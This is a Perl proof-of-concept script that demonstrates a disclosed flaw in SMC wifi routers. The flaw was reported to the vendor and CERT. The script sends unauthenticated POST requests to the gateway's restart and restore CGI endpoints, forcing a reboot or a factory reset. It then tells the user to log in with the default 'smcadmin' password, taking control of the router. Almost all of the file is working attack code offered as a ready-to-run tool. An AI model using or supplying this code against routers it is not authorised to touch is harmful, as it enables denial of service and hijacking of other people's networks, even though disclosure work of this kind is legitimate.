#!/usr/bin/perl -w
=head1 NAME
  $Id: ownMySmc.pl,v 1.3 2007/05/13 18:29:30 paulg Exp $
=head1 VERSION
  1.0
=head1 DESCRIPTION
  demonstrates security flaw (reported to SMC and CERT) in SMC wifi routers
  see also: http://tardate.blogspot.com/2007/02/letting-strangers-on-your-wifi-need.html

 HTTP POST Details:

<form method="POST" action="http://192.168.2.1/cgi-bin/restore.exe" name="RebootForm">
<input type="hidden" name="page" value="tools_restore">
<input type="hidden" name="logout">
To restore the factory default settings of the system,click on the &quot;SAVE SETTINGS&quot; button.
<input type="submit" name="savesetting" value="SAVE SETTINGS">

<form method="POST" action="/cgi-bin/restart.exe" name="RebootForm">
<input type="submit" name="savesetting" value="REBOOT ROUTER">

/cgi-bin/setup_pass.exe
<input type="hidden" name="restart_time" value="0">
<input type="hidden" name="reload" value="0">
<input type="hidden" name="restart_page" value="">
<input type="hidden" name="location_page" value="system_remote_mgmt.stm">
<input type="password" size="12" maxlength="12" name="userOldPswd" value="">
<input type="password" size="12" maxlength="12" name="userNewPswd" value="">
<input type="password" size="12" maxlength="12" name="userConPswd" value="">
<input type="text" name="timeout" size="3" maxlength="3">
<input type="submit" name="savesetting" value="SAVE SETTINGS">


=head1 AUTHOR
  Paul Gallagher gallagher.paul@gmail.com

=cut

use strict;
use warnings;

use Getopt::Long;
use LWP::UserAgent;
use HTTP::Response;
use Sys::Hostname;
use NetAddr::IP;

my $opt_help;
my $opt_gw;

GetOptions( 
	"help" => \$opt_help,
	"gw=s" => \$opt_gw 
);
my $opt_cmd = shift;

usage() if $opt_help;
usage() unless defined($opt_cmd);

# guess the gateway
if (! $opt_gw) {
$opt_gw = (NetAddr::IP->new(hostname,'255.255.255.0')->network + 1)->addr;
print "Guess your gateway is ", $opt_gw, "\n";
} else {
print "Using gateway ", $opt_gw, "\n";
}

# now branch to operation
if ( $opt_cmd =~ /reboot/i ) {
	reboot();
}
if ( $opt_cmd =~ /ownme/i ) {
	factoryreset();
}

1;

sub reboot {

	print "Commencing router reboot...";
	my $ua = LWP::UserAgent->new();
	my $url = 'http://' . $opt_gw . '/cgi-bin/restart.exe';
	
	my $response = $ua->post( $url, { savesetting => 'REBOOT ROUTER' } );
	
	if ($response->is_redirect()) {
		print ".. rebooting\n";
	} else {
		print ".. hmm, not the expected response:\n";
		print $response->content();
	}
	return;
}

sub factoryreset {

	print "Attempting to reset factory defaults ...";

	my $ua = LWP::UserAgent->new();
	my $url = 'http://' . $opt_gw . '/cgi-bin/restore.exe';
	
	my $response = $ua->post( $url, { savesetting => 'SAVE SETTINGS' } );
	
	if ($response->is_redirect()) {
		print ".. reset. Go to http://${opt_gw}/ and try password of 'smcadmin'\n";
	} else {
		print ".. hmm, not the expected response:\n";
		print $response->content();
	}
	return;
}

sub usage {
	print <<END_OF_USAGE;
Usage:
	ownMySmc.pl [options] [command]

	options:
		-help        # this message
		-gw=<value>  # set specific gateway address (use if script can't guess correctly)

	commands:
		reboot       # reboots router
		ownme        # performs factory reset and reboot

END_OF_USAGE

	exit;
}